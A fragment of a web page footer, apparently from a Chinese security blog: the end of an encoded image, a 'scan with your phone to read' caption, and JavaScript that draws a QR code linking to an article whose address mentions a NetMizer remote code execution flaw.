YLw2JN17Ba/WTXccqwTrCeY4zlyr+AOD1Cgc0+n5Rn7m01qe4yw/XK2jLP4e6doV39teszZkT97jn9uBU0PoLnLGq2Wm21fxPR9tIcc5iivb6zMuviw+x1w2P5pg5ZXFn2HFR4tu5OMnXsg2P9u4YrFZXsXCF54aUoLbfm4H7ob83N5PZ/7UhtSVi9HXNrOGj7/HxOic+HtkHtvXeTbe17vS0vOw/SaT5pLD0S9+X7vGxV0Znc8ZP7UhVwu4+dd34FMaQnd6Nm2dljKuNRxjHP1ZXZ5rat6y5NM5XJ/+0seSN+KzeOlnGnr+Waxyyj6lIVXots/ZgVND0r0ZXk0ZLX0COJ/AR5rUjSbIVi+aYDTxC2dc8XSdxAs5crRf+ivjuSa5tLbmiiUWDL/HU0MivvFndmBtCN1RnuMrS6XrpPsc/eJTp8Zl8bnW0rFoP4o1XxnHerTPhuMcdKzyY6PmT3y6Hu6/y3r7ZV/rDfll6/rXLue/AAAA//9ibXUHAAAABklEQVQDAEjnS6cfUH0cAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-weixin-nodeid-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 